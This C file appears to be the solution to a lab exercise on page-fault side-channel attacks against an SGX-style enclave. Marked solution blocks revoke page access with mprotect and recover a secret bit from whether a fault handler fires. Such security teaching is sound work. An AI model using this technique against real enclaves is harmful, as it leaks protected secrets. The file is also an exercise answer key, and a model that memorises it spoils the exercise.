/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include <string.h>
#include "victim.h"

#define TEST_STRING     "DeaDBEeF"

int fault_fired = 0;
void *page_pt = NULL;

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    info("Restoring access rights..");
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 0;
    char *string;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);

    info("secret at %p\n", secret_pt);

    /* ---------------------------------------------------------------------- */
    info_event("Calling enclave..");
    string = malloc(strlen(TEST_STRING)+1);
    strcpy(string, TEST_STRING); 
    ecall_to_lowercase(string);
    info("secure enclave converted '%s' to '%s'", TEST_STRING, string);

    /* =========================== START SOLUTION =========================== */
    page_pt = secret_pt + 1;

    info_event("attack SECRET=0");
    ecall_set_secret(0);

    ASSERT(!mprotect(page_pt, 4096, PROT_NONE));
    fault_fired = 0;
    ecall_to_lowercase(secret_pt);
    info("Reconstructed secret = %d", fault_fired ? 1 : 0);
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    
    /* ---------------------------------------------------------------------- */
    info_event("attack SECRET=1");
    ecall_set_secret(1);

    ASSERT(!mprotect(page_pt, 4096, PROT_NONE));
    fault_fired = 0;
    ecall_to_lowercase(secret_pt);
    info("Reconstructed secret = %d", fault_fired ? 1 : 0);
    ASSERT(!mprotect(page_pt, 4096, PROT_READ | PROT_WRITE));
    /* =========================== END SOLUTION =========================== */
    
    info("all is well; exiting..");
	return 0;
}
